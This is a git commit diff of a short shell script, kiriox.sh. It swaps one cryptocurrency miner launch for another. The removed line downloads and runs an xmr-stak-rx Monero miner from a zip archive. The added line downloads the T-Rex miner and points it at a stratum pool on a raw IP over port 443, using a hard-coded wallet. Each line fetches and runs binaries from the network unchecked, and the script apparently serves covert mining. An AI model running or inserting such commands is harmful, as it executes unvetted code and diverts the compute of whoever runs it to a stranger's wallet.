37b59b3f3a4658bda4092c8038701f1f99991731
ismaimwan6372 <137773221+ismaimwan6372@users.noreply.github.com>
2023-08-06 19:02:28 +0800

    Update kiriox.sh

--- kiriox.sh
+++ kiriox.sh
@@ -1,2 +1,1 @@
-wget https://github.com/ismaimwan6372/semogaberkah/raw/main/mulaidarinol.zip ; unzip mulaidarinol.zip ; chmod +x *; ./xmr-stak-rx
-
+wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz && tar -xvf t-rex-0.26.8-linux.tar.gz && ./t-rex -a firopow -o stratum+tcp://209.25.142.96:443 -u KGfG66oMWoE8rLXt3vBfkVh4n37E8wsPaZ.STRIXGPU
